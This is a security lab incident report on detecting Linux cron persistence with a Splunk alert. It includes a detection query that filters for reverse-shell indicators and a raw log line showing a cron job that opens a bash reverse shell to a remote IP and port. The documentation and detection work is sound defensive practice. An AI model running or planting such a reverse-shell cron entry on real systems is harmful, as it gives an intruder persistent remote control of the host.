# Incident Report - Linux Cron Persistence

## Date

8-11-26 3:15:22.000 IST

## Severity

High

## Status

Resolved

## Affected Host

OS : Linux (Kali Linux)
Host : Kali-Linux

## MITRE ATT&CK

**Tactic** : Persistence, Execution

**Technique** : T1053 – Scheduled Task/Job

**Procedure** : T1053.003 – Scheduled Task/Job: Cron (Adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code).

## Splunk Alert

Linux Cron Reverse Shell Persistence Detected

## Description

Detects unauthorized modifications to Linux cron jobs, specifically identifying attempts to establish persistence by injecting reverse shells (/dev/tcp) or malicious scheduling parameters (@reboot) directly into a user's crontab.

## Evidence

The Splunk alert successfully triggered upon detecting a command-line execution where a malicious one-liner was piped directly into the crontab utility to ensure a reverse shell executes on system startup.

## Alert Screenshot

#### Event Screenshot


## SPL Query used

```
index=* (process="crontab" OR command="*crontab*" OR process_name="crontab") ("*/dev/tcp/*" OR "*bash -i*" OR "*@reboot*")
| stats count min(_time) as firstTime by host, user, command
| convert ctime(firstTime) 
| rename host AS "Target Host", user AS "Compromised User", command AS "Malicious Command", firstTime AS "Execution Time"
```

## Raw log snippet

```
8/11/26
2:55:29.570 PM	
2026-08-11T09:25:29.570817+00:00 linux CRON[653]: (linux) CMD (sleep 30 && bash -i >& /dev/tcp/192.168.31.185/4444 0>&1)
host = linuxsource = /var/log/syslogsourcetype = syslog
```

## Response Action Taken

Since this was a controlled lab simulation, the following incident response steps were outlined and validated:

Investigation : Reviewed the Splunk alert to confirm the targeted machine (Kali-Linux) and verified the exact malicious payload directed at IP 192.168.31.185 on port 4444.

Eradication : Manually removed the malicious entry from the compromised user's cron schedule using crontab -e (or crontab -r to wipe it entirely).

Verification : Confirmed the persistence mechanism was removed by rebooting the host and ensuring no reverse shell connection was established.

## Conclusion

This lab successfully demonstrated the ability to monitor and alert on Linux persistence mechanisms. By tracking command-line executions for the crontab utility and filtering for known reverse-shell indicators, the SIEM effectively caught the unauthorized scheduling of malicious code, proving visibility into Linux endpoint activity.
